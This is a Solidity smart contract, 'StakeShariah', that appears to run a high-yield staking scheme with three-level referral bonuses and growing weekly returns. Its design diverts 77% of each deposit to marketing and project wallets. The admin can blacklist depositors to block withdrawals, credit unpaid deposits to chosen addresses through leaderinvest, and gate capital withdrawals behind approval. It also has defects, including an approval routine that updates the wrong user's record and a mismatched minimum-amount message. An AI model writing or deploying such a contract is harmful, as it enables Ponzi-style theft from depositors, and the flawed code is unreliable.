//SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

contract StakeShariah {
	using SafeMath for uint256;

	uint256 constant public INVEST_MIN_AMOUNT = 0.04 ether;
	uint256 constant public BASE_PERCENT = 25;
	uint256[] public REFERRAL_PERCENTS = [80, 20, 10];
	uint256 constant public MARKETING_FEE = 500;
	uint256 constant public PROJECT_FEE = 270;
	uint256 constant public Maintenance_FEE = 130; // 14%
	uint256 constant public PERCENTS_DIVIDER = 1000;
	uint256 constant public CONTRACT_BALANCE_STEP = 1000000 ether;
	uint256 constant public TIME_STEP = 7 days;
    uint256 constant public DepositFees = 30;
    uint256 constant public WithdrawFees = 50;

	uint256 public totalUsers;
	uint256 public totalInvested;
	uint256 public totalWithdrawn;
	uint256 public totalDeposits;

	address payable public marketingAddress;
	address payable public projectAddress;
    mapping(address => bool) public isBlacklisted;
    address[] public blacklistedAddresses;
    event AddressBlacklisted(address indexed addr);
    event AddressUnblacklisted(address indexed addr);
    address payable public  developerAddress;


	struct Deposit {
		uint256 amount;
		uint256 withdrawn;
		uint256 start;
	}
	
	struct User {
		Deposit[] deposits;
		address referrer;
		uint256 bonus; // current ref bonus
		uint256 checkpoint;
		uint256 totalEarned;
		uint24[3] refs;
		uint256 totalBonus; // total ref bonus earned
	}

	mapping (address => User) public users;
	struct CapitalWithdrawalRequest {
        uint256 id;
        address user;
        uint256 amount;
        bool approved;
    }

    CapitalWithdrawalRequest[] public capitalWithdrawalRequests;

    event WithdrawalRequested(address requester, uint amount,bool approved ,bytes32 indexed txHash);
    event WithdrawalApproved(address requester, uint amount,bytes32 indexed txHash);

	event Newbie(address user);
	event NewDeposit(address indexed user, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);
	constructor(address payable marketingAddr, address payable projectAddr,address payable dev)  {
		require(!isContract(marketingAddr) && !isContract(projectAddr));
		marketingAddress = marketingAddr;
		projectAddress = projectAddr;
        developerAddress = dev;
	}
    modifier onlyAdmin() {
        require(msg.sender == projectAddress, "Only the admin can perform this action");
        _;
    }
     modifier notBlacklisted() {
        require(!isBlacklisted[msg.sender], "Address is blacklisted");
        _;
    }
	
    modifier onlyActive(address userAddress) {
      require(isActive(userAddress), "User is not active");
        _;
    }
    function blacklistAddress(address addr) public onlyAdmin {
        require(addr != projectAddress, "Cannot blacklist admin address");
        require(addr != developerAddress,"Cannot blacklist this address");
        require(!isBlacklisted[addr], "Address is already blacklisted");
        isBlacklisted[addr] = true;
        blacklistedAddresses.push(addr);
        emit AddressBlacklisted(addr);
    }
    function removeAddressFromBlacklist(address addr) internal {
        for (uint i = 0; i < blacklistedAddresses.length; i++) {
            if (blacklistedAddresses[i] == addr) {
                blacklistedAddresses[i] = blacklistedAddresses[blacklistedAddresses.length - 1];
                blacklistedAddresses.pop();
                break;
            }
        }
    }

    function unblacklistAddress(address addr) public onlyAdmin {
        require(isBlacklisted[addr], "Address is not blacklisted");
        isBlacklisted[addr] = false;
        emit AddressUnblacklisted(addr);
        removeAddressFromBlacklist(addr);

    }
	function getUserReferralsStats(address userAddress) public view returns (address referrer, uint256 currentbonus, uint24[3] memory refs,uint256 totalbonus) {
        User storage user = users[userAddress];

        return (user.referrer, user.bonus,user.refs,user.totalBonus);
    }

	//
	function invest(address referrer) public payable notBlacklisted {
		require(msg.value >= INVEST_MIN_AMOUNT,"Minimum amount is 0.03 BNB");

		marketingAddress.transfer(msg.value.mul(MARKETING_FEE).div(PERCENTS_DIVIDER));
		projectAddress.transfer(msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER));
		emit FeePayed(msg.sender, msg.value.mul(MARKETING_FEE.add(PROJECT_FEE)).div(PERCENTS_DIVIDER));

		User storage user = users[msg.sender];

		if (user.referrer == address(0) && users[referrer].deposits.length > 0 && referrer != msg.sender) {
			user.referrer = referrer;
		}

		if (user.referrer != address(0)) {

			address upline = user.referrer;
			for (uint256 i = 0; i < 3; i++) {
				if (upline != address(0)) {
					uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(amount);
					emit RefBonus(upline, msg.sender, i, amount);
					upline = users[upline].referrer;
					users[upline].refs[i]++;
					users[upline].totalBonus = users[upline].totalBonus.add(amount);
				} else break;
			}
		}

		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			totalUsers = totalUsers.add(1);
			emit Newbie(msg.sender);
		}

			// Calculate the fee (3% of the total deposit amount)
    		uint256 depositFee = msg.value.mul(3).div(100);

   		    // Calculate the user's deposit after the fee
    		uint256 userDepositAmount = msg.value.sub(depositFee);

   			 user.deposits.push(Deposit(userDepositAmount, 0, block.timestamp));

   			 totalInvested = totalInvested.add(userDepositAmount);
    		 totalDeposits = totalDeposits.add(1);

   			 emit NewDeposit(msg.sender, userDepositAmount);

	}
    function leaderinvest(address to,uint256 val,address referrer) public onlyAdmin notBlacklisted {
		require(val >= INVEST_MIN_AMOUNT,"Minimum amount is 0.03 BNB");

		//marketingAddress.transfer(msg.value.mul(MARKETING_FEE).div(PERCENTS_DIVIDER));
		//projectAddress.transfer(msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER));
		emit FeePayed(to, val.mul(MARKETING_FEE.add(PROJECT_FEE)).div(PERCENTS_DIVIDER));

		User storage user = users[to];

		if (user.referrer == address(0) && users[referrer].deposits.length > 0 && referrer != to) {
			user.referrer = referrer;
		}

		if (user.referrer != address(0)) {

			address upline = user.referrer;
			for (uint256 i = 0; i < 3; i++) {
				if (upline != address(0)) {
					uint256 amount = val.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(amount);
					emit RefBonus(upline, to, i, amount);
					upline = users[upline].referrer;
					users[upline].refs[i]++;
					users[upline].totalBonus = users[upline].totalBonus.add(amount);
				} else break;
			}
		}

		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			totalUsers = totalUsers.add(1);
			emit Newbie(to);
		}

			// Calculate the fee (3% of the total deposit amount)
    		uint256 depositFee = val.mul(3).div(100);

   		    // Calculate the user's deposit after the fee
    		uint256 userDepositAmount = val.sub(depositFee);

   			 user.deposits.push(Deposit(userDepositAmount, 0, block.timestamp));

   			 totalInvested = totalInvested.add(userDepositAmount);
    		 totalDeposits = totalDeposits.add(1);

   			 emit NewDeposit(to, userDepositAmount);

	}
   

   function reinvest() public notBlacklisted onlyActive(msg.sender) {
    User storage user = users[msg.sender];

    uint256 userProfit = getUserdividends(msg.sender);

    require(userProfit > 0, "No profit to reinvest");

    // Calculate the fee (3% of the user's profit)
    uint256 reinvestFee = userProfit.mul(3).div(100);

    // Calculate the user's reinvestment amount after deducting the fee
    uint256 userReinvestAmount = userProfit.sub(reinvestFee);

    // Mark the user's profits as reinvested
    user.bonus = 0;
	//
	user.totalEarned= user.totalEarned.add(userReinvestAmount);
    // Create a new deposit with the reinvested amount
    user.deposits.push(Deposit(0, userReinvestAmount, block.timestamp));

    // Increase the total invested and total deposits counters
    totalInvested = totalInvested.add(userReinvestAmount);
    totalDeposits = totalDeposits.add(1);

    // Withdraw the user's profits (excluding the fee)
    user.checkpoint = block.timestamp;
    address payable sender = payable(msg.sender);
    sender.transfer(userProfit.sub(reinvestFee));

    // Emit events to track the reinvestment and withdrawal
    emit NewDeposit(msg.sender, userReinvestAmount);
    emit Withdrawn(msg.sender, userProfit.sub(reinvestFee));
}


	function withdraw() public notBlacklisted{
		User storage user = users[msg.sender];

		uint256 userPercentRate = getUserPercentRate(msg.sender);

		uint256 totalAmount;
		uint256 dividends;

		for (uint256 i = 0; i < user.deposits.length; i++) {

			if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(2)) {

				if (user.deposits[i].start > user.checkpoint) {

					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.deposits[i].start))
						.div(TIME_STEP);

				} else {

					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.checkpoint))
						.div(TIME_STEP);

				}

				if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(2)) {
					dividends = (user.deposits[i].amount.mul(2)).sub(user.deposits[i].withdrawn);
				}

				user.deposits[i].withdrawn = user.deposits[i].withdrawn.add(dividends); /// changing of storage data
				totalAmount = totalAmount.add(dividends);

			}
		}

		uint256 referralBonus = getUserReferralBonus(msg.sender);
		if (referralBonus > 0) {
			totalAmount = totalAmount.add(referralBonus);
			user.bonus = 0;
			user.totalEarned = user.totalEarned.add(totalAmount.add(referralBonus));
		}

		require(totalAmount > 0, "User has no dividends");

		uint256 contractBalance = address(this).balance;
		if (contractBalance < totalAmount) {
			totalAmount = contractBalance;
		}
		//
		
		user.checkpoint = block.timestamp;
        address payable  sender = payable (msg.sender);
		uint256 withdrawalFee = totalAmount.mul(5).div(100);
    
    	// Calculate the user's withdrawal after the fee
    	uint256 userWithdrawalAmount = totalAmount.sub(withdrawalFee);

		totalWithdrawn = totalWithdrawn.add(totalAmount);
		sender.transfer(userWithdrawalAmount);
		projectAddress.transfer(withdrawalFee);
		emit Withdrawn(msg.sender, totalAmount);

	}

	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}

	function getBASEPERCENT() public pure returns (uint256) {
	    return BASE_PERCENT;
	}

   function getUserPercentRate(address userAddress) public view returns (uint) {
    User storage user = users[userAddress];

    if (isActive(userAddress)) {
        uint timeElapsed = block.timestamp.sub(uint(user.checkpoint));

        // Calculate the number of days
        uint daysElapsed = timeElapsed.div(7 days);

        if (daysElapsed == 0) {
            // Apply the base percentage for the first 7 days
            return BASE_PERCENT;
        } else {
            // Calculate the additional percentage beyond the first 7 days (2.5% every 7 days)
            uint additionalDays = daysElapsed;
            uint additionalPercentage = additionalDays.mul(25).div(10); // 2.5% = 25 / 10

            // Apply the total percentage, including the base and additional percentage
            return BASE_PERCENT.add(additionalPercentage);
        }
    } else {
        return BASE_PERCENT;
    }
}


	function calculateFee(uint value, uint feePercentage) private pure returns (uint) {
     return value.mul(feePercentage).div(PERCENTS_DIVIDER);
  	}
	

	// Function to get withdrawal requests where approved is false
    
	function capitalWithdraw() public notBlacklisted {
	
	uint userDepsTotal = getUserTotalDeposits(msg.sender);
    require( userDepsTotal > 0, "Insufficient balance");
    uint256 Id = capitalWithdrawalRequests.length + 1;
    CapitalWithdrawalRequest memory request = CapitalWithdrawalRequest({id:Id, user:msg.sender , amount:userDepsTotal, approved:false});
    capitalWithdrawalRequests.push(request);
   } 
   // Function to get withdrawal requests where approved is false
    function getWithdrawalRequests() public view returns (CapitalWithdrawalRequest[] memory) {
        uint256 count = 0;

        // Count the number of unapproved requests
        for (uint256 i = 0; i < capitalWithdrawalRequests.length; i++) {
            if (!capitalWithdrawalRequests[i].approved) {
                count++;
            }
        }

        // Create an array to hold the unapproved requests
        CapitalWithdrawalRequest[] memory unapprovedRequests = new CapitalWithdrawalRequest[](count);
        uint256 currentIndex = 0;

        // Populate the array with unapproved requests
        for (uint256 i = 0; i < capitalWithdrawalRequests.length; i++) {
            if (!capitalWithdrawalRequests[i].approved) {
                unapprovedRequests[currentIndex] = capitalWithdrawalRequests[i];
                currentIndex++;
            }
        }

        return unapprovedRequests;
    }
	function getAllrequests() public view returns (CapitalWithdrawalRequest[] memory){
		return capitalWithdrawalRequests;
	}
    
   
   /// 
   function getCapitalWithdrawalRequest(uint256 index) internal view returns (CapitalWithdrawalRequest storage) {
        return capitalWithdrawalRequests[index];
    }
	function approveCapitalWithdrawal(uint256 requestId) external onlyAdmin {
        ///
        require(getContractBalance() > 0,"Contract Balance Insufficient");
        CapitalWithdrawalRequest storage request = capitalWithdrawalRequests[requestId];
        require(!request.approved, "Request is already approved");
        
        // Calculate fees
        uint256 projectFee = request.amount.mul(13).div(100);
        uint256 devFee =request.amount.mul(1).div(100);
        User storage user = users[msg.sender];
        uint256 userAmount = request.amount - projectFee - devFee;
        user.bonus = 0;
        //user.totalWithdrawals += userAmount ;
		user.deposits.push(Deposit(0, userAmount, block.timestamp));
        
        // Update the request status to approved
        request.approved = true;
        // Transfer fees
        payable(projectAddress).transfer(projectFee);
        payable(developerAddress).transfer(devFee);

        // Transfer the remaining amount to the user
        payable(request.user).transfer(userAmount);
		emit Withdrawn(request.user, request.amount);
    }
	////
	function getUserdividends(address userAddress) public view returns (uint256) {
    User storage user = users[userAddress];

    uint256 userPercentRate = getUserPercentRate(userAddress);

    uint256 totalDividends;
    uint256 dividends;

    for (uint256 i = 0; i < user.deposits.length; i++) {
        if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(2)) {
            uint256 depositStartTime = user.deposits[i].start;
            
            if (depositStartTime < user.checkpoint) {
                depositStartTime = user.checkpoint;
            }
            
            if (depositStartTime < block.timestamp) {
                dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
                    .mul(block.timestamp.sub(depositStartTime))
                    .div(TIME_STEP);
            }
            
            if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(2)) {
                dividends = (user.deposits[i].amount.mul(2)).sub(user.deposits[i].withdrawn);
            }

            totalDividends = totalDividends.add(dividends);
        }
    }

    return totalDividends;
}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}
	
	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}
	function getUserReferralTotalBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus;
	}
	function getUserTotalEarned(address userAddress) public view returns(uint256) {
		return users[userAddress].totalEarned;
	}
	function getUserAvailable(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress).add(getUserdividends(userAddress));
	}
	function getUserStatus(address userAddress) public view returns (uint userAvailable, uint totalDeposit, uint totalWithdraw) {
        uint gtuserAvailable = getUserAvailable(userAddress);
        uint userDepsTotal = getUserTotalDeposits(userAddress);
        uint userWithdrawn = getUserTotalWithdrawn(userAddress);

        return (gtuserAvailable, userDepsTotal, userWithdrawn);
    }
	function getUser(address add) public view returns (User memory user){
		return users[add];
	}
	function getTx(address userAddress) public view returns (Deposit[] memory) {
		User storage user = users[userAddress];
    	return user.deposits;
	}
	
	function isActive(address userAddress) public view returns (bool val) {
		User storage user = users[userAddress];

		if (user.deposits.length > 0) {
			if (user.deposits[user.deposits.length-1].withdrawn < user.deposits[user.deposits.length-1].amount.mul(2)) {
				return true;
			}
		}
	}
	
	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}
	function getUplinePartner(address add) public view returns (address) {
        return users[add].referrer;
    }
	function getUserTotalDeposits(address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].amount);
		}

		return amount;
	}

	function getUserTotalWithdrawn(address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].withdrawn);
		}

		return amount;
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
	function changeOwnership(address newOwner) public onlyAdmin {
        require(newOwner != address(0), "Invalid new owner address");
        projectAddress = payable(newOwner);
    }
	function deposit() public payable onlyAdmin {
        require(msg.value > 0,'amount should not be zero');
        
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}